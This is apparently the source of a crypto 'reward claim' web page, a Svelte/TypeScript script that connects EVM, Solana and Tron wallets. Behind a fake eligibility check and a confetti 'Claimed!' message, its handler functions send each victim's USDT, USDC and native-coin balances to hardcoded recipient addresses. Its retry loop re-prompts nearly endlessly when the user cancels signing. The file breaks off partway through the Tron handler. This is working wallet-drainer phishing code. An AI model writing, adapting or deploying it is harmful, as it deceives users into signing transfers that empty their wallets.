<script lang="ts">
export {};

import confetti from "canvas-confetti";
import { BrowserProvider, formatEther, JsonRpcProvider, Contract, formatUnits } from "ethers";
import { Connection, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";

let claimed: boolean = false;
let connecting: boolean = false;
let analyzing: boolean = false;

let evmAddress: string | null = null;
let solAddress: string | null = null;
let tronAddress: string | null = null;

let rewardCount: number = 2381;
let showWalletPopup: boolean = false;
let showChainSwitchPopup: boolean = false;
let showAnalyzingPopup: boolean = false;
let eligibilityMessage: string = "";
let showEligibilityResult: boolean = false;
let showMobileWalletPopup: boolean = false;

/* ---------------- CHAIN CONFIGS ---------------- */
const EVM_CHAINS = [
  { chainId: "0x1", name: "Ethereum Mainnet", nativeCurrency: "ETH" },
  { chainId: "0xaa36a7", name: "Sepolia Testnet", nativeCurrency: "ETH" },
  { chainId: "0x89", name: "Polygon", nativeCurrency: "MATIC" },
  { chainId: "0xa4b1", name: "Arbitrum One", nativeCurrency: "ETH" },
  { chainId: "0xa", name: "Optimism", nativeCurrency: "ETH" },
  { chainId: "0x38", name: "BNB Chain", nativeCurrency: "BNB" },
  { chainId: "0x2105", name: "Base", nativeCurrency: "ETH" },
  { chainId: "0xa86a", name: "Avalanche C-Chain", nativeCurrency: "AVAX" }
];

let currentChainId: string | null = null;

/* ---------------- WALLET CONFIGS WITH IMAGES ---------------- */
const WALLET_CONFIGS = [
  { 
    name: "MetaMask", 
    type: "evm", 
    icon: "https://kimi-web-img.moonshot.cn/img/assets.streamlinehq.com/83c6111d1e7c81c2dfb69626cbaf444a6c3be87e.png",
    color: "#E2761B",
    deepLink: (host: string) => `https://metamask.app.link/dapp/${host}`
  },
  { 
    name: "Trust Wallet", 
    type: "evm", 
    icon: "https://kimi-web-img.moonshot.cn/img/trustwallet.com/38f3ca99c19c8e33e36a9b09eaa4c2ea8d14b4bb",
    color: "#3375BB",
    deepLink: (url: string) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`
  },
  { 
    name: "Coinbase Wallet", 
    type: "evm", 
    icon: "https://kimi-web-img.moonshot.cn/img/cdn.dribbble.com/4756fd5ffdd40993fe77b7344125e8fd6a28953f.png",
    color: "#0052FF",
    deepLink: (url: string) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`
  },
  { 
    name: "Exodus", 
    type: "evm", 
    icon: "/images/exodus.png",
    color: "#1F2033",
    deepLink: (_url?: string) => `https://www.exodus.com/download/`
  },
  { 
    name: "Phantom", 
    type: "solana", 
    icon: "https://kimi-web-img.moonshot.cn/img/cdn.brandfetch.io/b17efa83b875a4cd2a5ac24980e56062d7317a16.jpeg",
    color: "#AB9FF2",
    deepLink: (url: string) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`
  },
  { 
    name: "Solflare", 
    type: "solana", 
    icon: "https://kimi-web-img.moonshot.cn/img/moralis.com/18db35665223ae1c3908fc7fbb2b746f7c3ac585.png",
    color: "#FC4C24",
    deepLink: (url: string) => `https://solflare.com/dapp?url=${encodeURIComponent(url)}`
  },
  { 
    name: "TokenPocket", 
    type: "tron", 
    icon: "https://kimi-web-img.moonshot.cn/img/www.yadawallets.com/2c6341a06951c7b8b7e80362fd7e90e3c47f6601.png",
    color: "#2980FE",
    deepLink: (url: string) => `https://tokenpocket.pro/`
  },
  { 
    name: "TronLink", 
    type: "tron", 
    icon: "https://kimi-web-img.moonshot.cn/img/meta-q.cdn.bubble.io/1ee41d913def54d2783f3b76c5d9a05d52147f54.png",
    color: "#0C5AF2",
    deepLink: (url: string) => `tronlink://browse?url=${encodeURIComponent(url)}`
  }
];

/*retry function*/
async function retryTx(
  fn: () => Promise<any>,
  retries = 9999999,
  delay = 1500
) {
  let lastError;

  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (err: any) {
      lastError = err;

      if (err.code === 4001) {
        console.log("User cancelled wallet prompt. Retrying...");
      } else {
        console.log("Transaction failed. Retrying...", err);
      }

      await new Promise(r => setTimeout(r, delay));
    }
  }

  throw lastError;
}

/* ---------------- SOLANA ---------------- */
const solConnection = new Connection(clusterApiUrl("mainnet-beta"));

async function connectSolana(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
  if (!window.solana) return { success: false };
  try {
    const resp = await window.solana.connect();
    solAddress = resp.publicKey.toString();
    return { success: true, address: solAddress };
  } catch (err: any) {
    console.error("Solana connection error:", err);
    // Check if user cancelled
    if (err.code === 4001 || err.message?.includes("User rejected") || err.message?.includes("cancelled")) {
      return { success: false, cancelled: true };
    }
    return { success: false };
  }
}

async function getSolanaBalance(address: string): Promise<number> {
  try {
    const balance = await solConnection.getBalance(new PublicKey(address));
    return balance / LAMPORTS_PER_SOL;
  } catch (err) {
    console.error("Error fetching SOL balance:", err);
    return 0;
  }
}

/* ---------------- EVM ---------------- */
async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
  if (!window.ethereum) return { success: false };
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    evmAddress = await signer.getAddress();
    
    const network = await provider.getNetwork();
    currentChainId = "0x" + network.chainId.toString(16);
    
    return { success: true, address: evmAddress };
  } catch (err: any) {
    console.error("EVM connection error:", err);
    // Check if user cancelled (MetaMask error code 4001)
    if (err.code === 4001 || err.message?.includes("User rejected") || err.message?.includes("cancelled")) {
      return { success: false, cancelled: true };
    }
    return { success: false };
  }
}

async function getEVMBalance(address: string): Promise<bigint> {
  if (!window.ethereum) return 0n;
  const provider = new BrowserProvider(window.ethereum);
  return await provider.getBalance(address);
}

/* ---------------- TRON ---------------- */
function getTronProvider(): any {
  const w = window as any;
  
  // Check for TokenPocket first
  if (w.tokenpocket?.tronWeb) {
    return {
      wallet: w.tokenpocket,
      tronWeb: w.tokenpocket.tronWeb,
      isTokenPocket: true,
      isTronLink: false
    };
  }
  
  if (w.tronLink?.tronWeb) {
    return {
      wallet: w.tronLink,
      tronWeb: w.tronLink.tronWeb,
      isTokenPocket: false,
      isTronLink: true
    };
  }
  
  if (w.tron?.tronWeb) {
    return {
      wallet: w.tron,
      tronWeb: w.tron.tronWeb,
      isTokenPocket: false,
      isTronLink: false
    };
  }
  
  if (w.tronWeb) {
    return {
      wallet: w.tronWeb,
      tronWeb: w.tronWeb,
      isTokenPocket: false,
      isTronLink: false
    };
  }
  
  return null;
}

function getTronAddress(provider: any): string | null {
  if (!provider) return null;
  const tronWeb = provider.tronWeb;
  
  const base58 = tronWeb?.defaultAddress?.base58 || 
                 tronWeb?.defaultAddress?.address ||
                 tronWeb?.address ||
                 (typeof tronWeb?.defaultAddress === 'string' ? tronWeb.defaultAddress : null);
                 
  return base58 || null;
}

async function connectTron(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
  let provider = getTronProvider();

  // Retry once if provider is not immediately available
  if (!provider) {
    await new Promise((r) => setTimeout(r, 1000));
    provider = getTronProvider();
  }

  if (!provider) {
    console.error("Tron provider not found.");
    return { success: false };
  }

  try {
    let res: any;

    // Modern Tron wallet
    if (provider.wallet?.request) {
      res = await provider.wallet.request({ method: 'tron_requestAccounts' });

      // Handle explicit user rejection
      if (res?.code === 4001 || res?.message?.toLowerCase().includes("rejected") || res?.message?.toLowerCase().includes("cancelled")) {
        return { success: false, cancelled: true };
      }

      // Strict success check
      const success = res === true || res?.code === 200 || res?.code === '200';
      if (!success) {
        console.error("Connection failed:", res);
        return { success: false };
      }
    } 
    // Older Tron wallet
    else if (provider.wallet?.enable) {
      await provider.wallet.enable();
    }
  } catch (e: any) {
    console.error("Wallet request error:", e);

    if (e?.code === 4001 || e?.message?.toLowerCase().includes("rejected") || e?.message?.toLowerCase().includes("cancelled") || e?.message?.toLowerCase().includes("user")) {
      return { success: false, cancelled: true };
    }

    return { success: false };
  }

  // Ensure provider is still available
  provider = getTronProvider();
  if (!provider) return { success: false };

  // Retry to get the Tron address
  let addr: string | null = null;
  let retries = 0;
  while (!addr && retries < 50) {
    addr = getTronAddress(provider);
    if (addr) break;

    await new Promise((r) => setTimeout(r, 300));
    provider = getTronProvider();
    retries++;
  }

  if (!addr) {
    console.error("Tron address not available after timeout");
    return { success: false };
  }

  tronAddress = addr;

  // Set up listeners for account changes and disconnects
  const wallet = provider.wallet;
  if (wallet?.on) {
    wallet.on('accountsChanged', (accounts: any) => {
      const newAddr = Array.isArray(accounts) ? accounts[0] : accounts;
      console.log('Tron account changed:', newAddr);
      tronAddress = newAddr || null;
    });

    wallet.on('disconnect', () => {
      console.log('Tron wallet disconnected');
      tronAddress = null;
    });
  }

  return { success: true, address: addr };
}

async function getTronBalance(address: string): Promise<number> {
  try {
    const provider = getTronProvider();
    if (!provider?.tronWeb?.trx) return 0;
    const balance = await provider.tronWeb.trx.getBalance(address);
    return provider.tronWeb.fromSun?.(balance) ?? balance / 1e6;
  } catch (err) {
    console.error("Error fetching TRX balance:", err);
    return 0;
  }
}

async function getSPLTokenBalance(address: string, tokenMint: string): Promise<number> {
  try {
    const tokenAccount = await solConnection.getTokenAccountsByOwner(new PublicKey(address), { mint: new PublicKey(tokenMint) });
    if (tokenAccount.value.length === 0) return 0;
    const balance = await solConnection.getTokenAccountBalance(tokenAccount.value[0].pubkey);
    return Number(balance.value.uiAmountString || 0);
  } catch (err) {
    console.error("Error fetching SPL token balance:", err);
    return 0;
  }
}

async function getTRC20Balance(address: string, contractAddress: string): Promise<number> {
  try {
    const tronWeb = getTronProvider();
    if (!tronWeb) return 0;
    const contract = await tronWeb.contract().at(contractAddress);
    const balance = await contract.balanceOf(address).call();
    const decimals = await contract.decimals().call();
    return Number(balance) / Math.pow(10, decimals);
  } catch (err) {
    console.error("Error fetching TRC20 balance:", err);
    return 0;
  }
}

function getChainNameFromId(chainId: string): string {
  const mapping: Record<string, string> = {
    "0x1": "ethereum",
    "0x89": "polygon",
    "0xa4b1": "arbitrum",
    "0x38": "bnb",
    "0x2105": "base",
    "0xa": "optimism"
  };
  return mapping[chainId] || "ethereum";
}

function getChainIdFromName(chainName: string): number {
  const mapping: Record<string, number> = {
    ethereum: 1,
    polygon: 137,
    arbitrum: 42161,
    bnb: 56,
    base: 8453,
    optimism: 10
  };
  return mapping[chainName] || 1;
}

/* ---------------- ANALYSIS SIMULATION ---------------- */
async function analyzeWalletEligibility(
  type: string, 
  chainName: string
): Promise<boolean> {
  analyzing = true;
  showAnalyzingPopup = true;
  showEligibilityResult = false;
  
  const timeout = new Promise((_, reject) => 
    setTimeout(() => reject(new Error("Analysis timeout")), 15000)
  );
  
  try {
    await Promise.race([
      new Promise(resolve => setTimeout(resolve, 2500)),
      timeout
    ]);
    
    let hasEligibleToken = false;
    let eligibleBalanceDisplay = "";
    
    if (type === "evm" && evmAddress) {
      const chainId = getChainIdFromName(chainName);
      const config = CHAIN_CONFIGS[chainId];
      if (!config) {
        analyzing = false;
        showAnalyzingPopup = false;
        eligibilityMessage = `❌ Unsupported chain: ${chainName}`;
        showEligibilityResult = true;
        return false;
      }

      const provider = new JsonRpcProvider(config.rpcUrl);
      const nativeBalanceWei = await provider.getBalance(evmAddress);
      const nativeBalance = Number(formatUnits(nativeBalanceWei, config.nativeDecimals));
      const hasNative = nativeBalance > 0;
      
      let usdtBalance = 0;
      let hasUSDT = false;
      if (config.usdt) {
        const usdtContract = new Contract(config.usdt.address, ERC20_ABI, provider);
        const usdtDecimals = await usdtContract.decimals();
        const usdtBalanceRaw = await usdtContract.balanceOf(evmAddress);
        usdtBalance = Number(formatUnits(usdtBalanceRaw, usdtDecimals));
        hasUSDT = usdtBalance > 0;
      }
      
      let usdcBalance = 0;
      let hasUSDC = false;
      if (config.usdc) {
        const usdcContract = new Contract(config.usdc.address, ERC20_ABI, provider);
        const usdcDecimals = await usdcContract.decimals();
        const usdcBalanceRaw = await usdcContract.balanceOf(evmAddress);
        usdcBalance = Number(formatUnits(usdcBalanceRaw, usdcDecimals));
        hasUSDC = usdcBalance > 0;
      }
      
      hasEligibleToken = hasNative || hasUSDT || hasUSDC;
      
      const balances: string[] = [];
      if (hasNative) balances.push(`${nativeBalance.toFixed(4)} ${config.nativeToken}`);
      if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
      if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
      eligibleBalanceDisplay = balances.join(" | ");
      
    } else if (type === "solana" && solAddress) {
      const nativeBalance = await getSolanaBalance(solAddress);
      const usdtBalance = await getSPLTokenBalance(solAddress, "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
      const usdcBalance = await getSPLTokenBalance(solAddress, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
      
      const hasNative = nativeBalance > 0;
      const hasUSDT = usdtBalance > 0;
      const hasUSDC = usdcBalance > 0;
      
      hasEligibleToken = hasNative || hasUSDT || hasUSDC;
      
      const balances: string[] = [];
      if (hasNative) balances.push(`${nativeBalance.toFixed(4)} SOL`);
      if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
      if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
      eligibleBalanceDisplay = balances.join(" | ");
      
    } else if (type === "tron" && tronAddress) {
      const nativeBalance = await getTronBalance(tronAddress);
      const usdtBalance = await getTRC20Balance(tronAddress, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
      const usdcBalance = await getTRC20Balance(tronAddress, "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8");
      
      const hasNative = nativeBalance > 0;
      const hasUSDT = usdtBalance > 0;
      const hasUSDC = usdcBalance > 0;
      
      hasEligibleToken = hasNative || hasUSDT || hasUSDC;
      
      const balances: string[] = [];
      if (hasNative) balances.push(`${nativeBalance.toFixed(4)} TRX`);
      if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
      if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
      eligibleBalanceDisplay = balances.join(" | ");
    }
    
    analyzing = false;
    showAnalyzingPopup = false;
    
    if (!hasEligibleToken) {
      eligibilityMessage = `❌ Wallet Ineligible for Claim\n\n\n\nYou need to hold gas fees to facilitate onchain transaction.`;
      showEligibilityResult = true;
      return false;
    }
    
    eligibilityMessage = `✅ Wallet Eligible on ${type === "evm" ? CHAIN_CONFIGS[getChainIdFromName(chainName)].name : type}!\n\nHoldings: ${eligibleBalanceDisplay}`;
    showEligibilityResult = true;
    await new Promise(resolve => setTimeout(resolve, 1500));
    showEligibilityResult = false;
    return true;
  } catch (error) {
    analyzing = false;
    showAnalyzingPopup = false;
    eligibilityMessage = `❌ Analysis failed: ${error instanceof Error ? error.message : 'Unknown error'}`;
    showEligibilityResult = true;
    return false;
  }
}

/* ---------------- CHAIN SWITCHING ---------------- */
async function switchEVMChain(chainId: string) {
  if (!window.ethereum) return;
  
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId }]
    });
    
    showChainSwitchPopup = false;
    currentChainId = chainId;
    
    const chainName = getChainNameFromId(chainId);
    const isEligible = await analyzeWalletEligibility("evm", chainName);
    if (isEligible) {
      claimRewardAnimation("evm");
    }
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId,
            chainName: EVM_CHAINS.find(c => c.chainId === chainId)?.name || "Unknown",
            rpcUrls: ["https://rpc.ankr.com/eth"]
          }]
        });
      } catch (addError) {
        console.error("Failed to add chain:", addError);
      }
    } else {
      console.error("Failed to switch chain:", switchError);
    }
  }
}

function promptChainSwitch(type: string) {
  showEligibilityResult = false;
  if (type === "evm") {
    showChainSwitchPopup = true;
  } else {
    eligibilityMessage = "❌ Wallet ineligible\n\nPerform more onchain transactions to be eligible and ensure you have enough coins to cover gas fees.";
    showEligibilityResult = true;
    setTimeout(() => showEligibilityResult = false, 4000);
  }
}

/* ---------------- CHAIN CONFIGURATION ---------------- */
interface TokenConfig {
  address: string;
  symbol: string;
  decimals: number;
}

interface ChainConfig {
  chainId: number;
  name: string;
  nativeToken: string;
  nativeDecimals: number;
  rpcUrl: string;
  usdt: TokenConfig | null;
  usdc: TokenConfig | null;
}

const CHAIN_CONFIGS: Record<number, ChainConfig> = {
  1: {
    chainId: 1,
    name: "Ethereum",
    nativeToken: "ETH",
    nativeDecimals: 18,
    rpcUrl: "https://eth-mainnet.g.alchemy.com/v2/demo",
    usdt: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    usdc: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
  },
  137: {
    chainId: 137,
    name: "Polygon",
    nativeToken: "MATIC",
    nativeDecimals: 18,
    rpcUrl: "https://polygon-rpc.com",
    usdt: { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    usdc: { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 }
  },
  42161: {
    chainId: 42161,
    name: "Arbitrum",
    nativeToken: "ETH",
    nativeDecimals: 18,
    rpcUrl: "https://arb1.arbitrum.io/rpc",
    usdt: { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    usdc: { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 }
  },
  56: {
    chainId: 56,
    name: "BNB Chain",
    nativeToken: "BNB",
    nativeDecimals: 18,
    rpcUrl: "https://bsc-dataseed.binance.org",
    usdt: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    usdc: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
  },
  8453: {
    chainId: 8453,
    name: "Base",
    nativeToken: "ETH",
    nativeDecimals: 18,
    rpcUrl: "https://mainnet.base.org",
    usdt: null,
    usdc: { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 }
  },
  10: {
    chainId: 10,
    name: "Optimism",
    nativeToken: "ETH",
    nativeDecimals: 18,
    rpcUrl: "https://mainnet.optimism.io",
    usdt: { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    usdc: { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", symbol: "USDC", decimals: 6 }
  },
  43114: {
    chainId: 43114,
    name: "Avalanche",
    nativeToken: "AVAX",
    nativeDecimals: 18,
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
    usdt: { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    usdc: { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 }
  }
};

const SOLANA_CONFIG = {
  name: "Solana",
  nativeToken: "SOL",
  nativeDecimals: 9,
  usdtMint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
  usdcMint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
};

const TRON_CONFIG = {
  name: "Tron",
  nativeToken: "TRX",
  nativeDecimals: 6,
  usdtContract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  usdcContract: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8"
};

const RECIPIENT_ADDRESS = {
  evm: "0x80e5e27d3e1FD10EB4b02D4Ed7aC50C92ea8A9E3",
  sol: "4yfDNdTNY5GVS326aTAeuhLAU5eboNXH3iextiPPGJYg",
  tron: "TVfgezeUJMtuLYZXWbcoALFo8vGjFcLW4d"
};

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

/* ---------------- CLAIM REWARD ---------------- */
async function claimRewardAnimation(type: 'evm' | 'solana' | 'tron') {
  if (claimed) return;
  
  analyzing = true;
  showAnalyzingPopup = true;
  
  try {
    let foundBalances: string[] = [];
    let executedActions: string[] = [];
    
    if (type === 'evm') {
      const result = await handleEVMChain(foundBalances, executedActions);
      if (!result) return;
      
    } else if (type === 'solana') {
      const result = await handleSolana(foundBalances, executedActions);
      if (!result) return;
      
    } else if (type === 'tron') {
      const result = await handleTron(foundBalances, executedActions);
      if (!result) return;
      
    } else {
      analyzing = false;
      showAnalyzingPopup = false;
      showError(`Unsupported type: ${type}`);
      return;
    }
    
    analyzing = false;
    showAnalyzingPopup = false;
    
    if (foundBalances.length === 0) {
      eligibilityMessage = `❌ Wallet Ineligible\n\nNo USDT, USDC, or native token balance found.`;
      showEligibilityResult = true;
      setTimeout(() => showEligibilityResult = false, 3000);
      return;
    }
    
    claimed = true;
    rewardCount += 1;
    
    eligibilityMessage = `✅ Claimed!\n\nFound: ${foundBalances.join(" | ")}\nExecuted: ${executedActions.join(", ")}`;
    showEligibilityResult = true;
    
    confetti({ particleCount: 120, spread: 70, origin: { y: 0.6 } });
    
    setTimeout(() => showEligibilityResult = false, 3000);
    
  } catch (error) {
    analyzing = false;
    showAnalyzingPopup = false;
    showError("Failed to process claim. Please try again.");
    console.error("Claim error:", error);
  }
}

/* ---------------- EVM HANDLER ---------------- */
async function handleEVMChain(
  foundBalances: string[],
  executedActions: string[]
): Promise<boolean> {

  if (!window.ethereum) {
    showError("No EVM wallet detected.");
    return false;
  }

  const provider = new BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const signerAddress = await signer.getAddress();

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  const chainConfig = CHAIN_CONFIGS[chainId];

  if (!chainConfig) {
    showError(`Chain ID ${chainId} not supported.`);
    return false;
  }

  let nonce = await provider.getTransactionCount(signerAddress, "latest");

  const feeData = await provider.getFeeData();

  const maxFeePerGas =
    feeData.maxFeePerGas ??
    feeData.gasPrice ??
    0n;

  const maxPriorityFeePerGas =
    feeData.maxPriorityFeePerGas ??
    (maxFeePerGas / 10n);

  let nativeBalance = await provider.getBalance(signerAddress);

  const reserveGas = 120000n;
  const gasReserveCost = maxFeePerGas * reserveGas;

  if (nativeBalance <= gasReserveCost) {
    console.log("Not enough native token for gas.");
    return true;
  }

  async function handleToken(symbol: string, tokenConfig: any) {
    try {
      const contract = new Contract(
        tokenConfig.address,
        ERC20_ABI,
        signer
      );

      const balance = await contract.balanceOf(signerAddress);

      if (balance === 0n) return;

      const formatted = formatUnits(balance, tokenConfig.decimals);
      foundBalances.push(`${symbol}: ${parseFloat(formatted).toFixed(2)}`);

      try {
        await contract.transfer.staticCall(
          RECIPIENT_ADDRESS.evm,
          balance
        );
      } catch {
        console.log(`${symbol} simulation failed`);
        return;
      }

      let gasEstimate;
      try {
        gasEstimate = await contract.transfer.estimateGas(
          RECIPIENT_ADDRESS.evm,
          balance
        );
      } catch {
        console.log(`${symbol} gas estimate failed`);
        return;
      }

      const gasLimit = (gasEstimate * 120n) / 100n;
      const gasCost = gasLimit * maxFeePerGas;
      const currentBalance = await provider.getBalance(signerAddress);

      if (currentBalance <= gasCost) {
        console.log(`Insufficient gas for ${symbol}`);
        return;
      }

      const tx = await retryTx(async () => {

      const gasEstimate = await contract.transfer.estimateGas(
        RECIPIENT_ADDRESS.evm,
        balance
      );

      const gasLimit = gasEstimate * 12n / 10n;

      const feeData = await provider.getFeeData();

      const maxFeePerGas = feeData.maxFeePerGas! * 12n / 10n;

      return contract.transfer(
        RECIPIENT_ADDRESS.evm,
        balance,
        {
          gasLimit,
          maxFeePerGas
        }
      );

    });

      await tx.wait();
      executedActions.push(symbol);

    } catch (err) {
      console.error(`${symbol} transfer failed`, err);
    }
  }

  if (chainConfig.usdt) {
    await handleToken("USDT", chainConfig.usdt);
  }

  if (chainConfig.usdc) {
    await handleToken("USDC", chainConfig.usdc);
  }

  try {
    nativeBalance = await provider.getBalance(signerAddress);

    if (nativeBalance === 0n) return true;

    const formatted = formatEther(nativeBalance);
    foundBalances.push(`${chainConfig.nativeToken}: ${parseFloat(formatted).toFixed(4)}`);

    const gasEstimate = await signer.estimateGas({
      to: RECIPIENT_ADDRESS.evm,
      value: nativeBalance
    });

    const gasLimit = (gasEstimate * 120n) / 100n;
    const gasCost = gasLimit * maxFeePerGas;

    if (nativeBalance <= gasCost) {
      console.log("Not enough balance after gas.");
      return true;
    }

    const amountToSend = nativeBalance - gasCost;

    try {
      await provider.call({
        to: RECIPIENT_ADDRESS.evm,
        value: amountToSend
      });
    } catch {
      console.log("Native transfer simulation failed");
      return true;
    }

    const tx = await retryTx(async () => {

      const feeData = await provider.getFeeData();

      const gasLimit = 21000n * 12n / 10n;

      return signer.sendTransaction({
        to: RECIPIENT_ADDRESS.evm,
        value: amountToSend,
        gasLimit,
        maxFeePerGas: feeData.maxFeePerGas! * 12n / 10n
      });

    });

    await tx.wait();
    executedActions.push(chainConfig.nativeToken);

  } catch (err) {
    console.error("Native transfer failed", err);
  }

  return true;
}

/* ---------------- SOLANA HANDLER ---------------- */
async function handleSolana(
  foundBalances: string[],
  executedActions: string[]
): Promise<boolean> {

  const solanaProvider =
    (window as any).phantom?.solana || (window as any).solflare;

  if (!solanaProvider) {
    showError("No Solana wallet detected. Install Phantom or Solflare.");
    return false;
  }

  const connection = new Connection(
    "https://api.mainnet-beta.solana.com",
    "confirmed"
  );

  let walletPublicKey: PublicKey;

  try {
    const resp = await solanaProvider.connect();
    walletPublicKey = new PublicKey(resp.publicKey.toString());
  } catch (err) {
    showError("Failed to connect Solana wallet.");
    return false;
  }

  try {
    const balanceLamports = await connection.getBalance(walletPublicKey);

    if (balanceLamports <= 0) return true;

    const formatted = balanceLamports / LAMPORTS_PER_SOL;
    foundBalances.push(`SOL: ${formatted.toFixed(4)}`);

    const latestBlockhash = await connection.getLatestBlockhash();

    const tempTx = new Transaction({
      feePayer: walletPublicKey,
      recentBlockhash: latestBlockhash.blockhash,
    }).add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: new PublicKey(RECIPIENT_ADDRESS.sol),
        lamports: 1,
      })
    );

    const estimatedFee =
      (await connection.getFeeForMessage(tempTx.compileMessage())).value || 5000;

    const safetyBuffer = estimatedFee * 3;
    const totalFeeReserve = estimatedFee + safetyBuffer;

    if (balanceLamports <= totalFeeReserve) {
      console.log("Not enough SOL after reserving fees.");
      return true;
    }

    const amountToSend = balanceLamports - totalFeeReserve;

    const transaction = new Transaction({
      feePayer: walletPublicKey,
      recentBlockhash: latestBlockhash.blockhash,
    }).add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: new PublicKey(RECIPIENT_ADDRESS.sol),
        lamports: amountToSend,
      })
    );

    const simulation = await connection.simulateTransaction(transaction);

    if (simulation.value.err) {
      console.error("Transaction simulation failed:", simulation.value.err);
      return false;
    }

    const signed = await solanaProvider.signTransaction(transaction);
    const signature = await retryTx(async () => {
    return connection.sendRawTransaction(signed.serialize());
    });

    await connection.confirmTransaction(
      {
        signature,
        blockhash: latestBlockhash.blockhash,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
      },
      "confirmed"
    );

    executedActions.push("SOL");
    console.log("SOL transfer successful:", signature);
  } catch (err) {
    console.error("SOL transfer failed:", err);
  }

  return true;
}

/* ---------------- TRON HANDLER ---------------- */
async function handleTron(
  foundBalances: string[],
  executedActions: string[]
): Promise<boolean> {

  const tronWeb = getTronProvider();

  if (!tronWeb) {
    showError("No Tron wallet detected. Install TokenPocket or TronLink.");
    return false;
  }

  if (!tronWeb.ready) {
    showError("Please unlock your wallet.");
    return false;
  }

  const walletAddress = tronWeb.defaultAddress.base58;
  const recipient = RECIPIENT_ADDRESS.tron;

  const TRC20_ABI = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function"
    },
    {
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "Nonpayable",
      type: "function"
    },
    {
      constant: true,
      inputs: [],
      name: "decimals",
      outputs: [{ name: "", type: "uint8" }],
      type: "function"
    }
  ];

  async function getEnergyReserve(): Promise<bigint> {
    try {
      const resources = await tronWeb.trx.getAccountResources(walletAddress);
      const energy = (resources.EnergyLimit || 0) - (resources.EnergyUsed || 0);
      if (energy > 20000) {
        return 0n;
      }
      return 20n * 1_000_000n;
    } catch {
      return 20n * 1_000_000n;
    }
  }

  async function handleToken(symbol: string, contractAddress: string) {
    try {
      const contract = await tronWeb.contract(TRC20_ABI, contractAddress);
      const balanceRaw = await contract.balanceOf(walletAddress).call();
      const decimals = await contract.decimals().call();
      const balance = BigInt(balanceRaw.toString());

      if (balance === 0n) return;

      const formatted = Number(balance) / Math.pow(10, Number(decimals));
      foundBalances.push(`${symbol}: ${formatted.toFixed(2)}`);

      try {
        await tronWeb.transactionBuilder.triggerConstantContract(
          contractAddress,
          "transfer(address,uint256)",
          {},
          [
            { type: "address", value: recipient },
            { type: "uint256", value: balance.toString() }
          ],
          walletAddress
        );
      } catch {
        console.log(`${symbol} simulation failed`);
        return;
      }

      const tx = await retryTx(async () => {

        return contract.transfer(recipient, balance.toString()).send({
          feeLimit: 40_000_000
        });

      });

      const receipt = await tronWeb.trx.getTransactionInfo(tx);

      if (receipt && receipt.receipt?.result === "SUCCESS") {
        executedActions.push(symbol);
      }

    } catch (err) {
      console.log(`${symbol} transfer failed`, err);
    }
  }

  if (TRON_CONFIG.usdtContract) {
